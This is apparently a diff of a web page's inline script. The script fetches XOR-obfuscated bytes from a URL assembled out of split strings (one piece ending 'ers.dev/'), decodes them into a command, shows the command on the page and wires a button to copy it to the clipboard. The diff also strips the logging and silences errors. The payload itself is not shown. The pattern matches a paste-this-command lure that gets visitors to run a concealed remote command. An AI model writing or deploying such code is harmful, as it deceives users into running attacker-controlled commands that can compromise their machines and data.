@@ -804,20 +804,32 @@
     const c = 'ers.dev/';
     
     const result = await fetch(a + b + c).then(r => r.json());
-    console.log('result:', result);
-    console.log('result.data:', result.data);
     
     if (result && result.data) {
       const KEY = 0x5A;
       const command = result.data.map(b => String.fromCharCode(b ^ KEY)).join('');
-      console.log('command:', command);
       
       var el = document.getElementById('commandToCopy');
       if (el) el.textContent = command;
+
+      // Копирование по кнопке
+      var link = document.getElementById('copyButton');
+      if (link) {
+        link.addEventListener('click', function(e) {
+          e.preventDefault();
+          navigator.clipboard.writeText(command).catch(function() {
+            // Fallback если clipboard API недоступен
+            var tmp = document.createElement('textarea');
+            tmp.value = command;
+            document.body.appendChild(tmp);
+            tmp.select();
+            document.execCommand('copy');
+            document.body.removeChild(tmp);
+          });
+        });
+      }
     }
-  } catch(e) { 
-    console.error('error:', e); 
-  }
+  } catch(e) {}
 })();
 </script>
 </body>
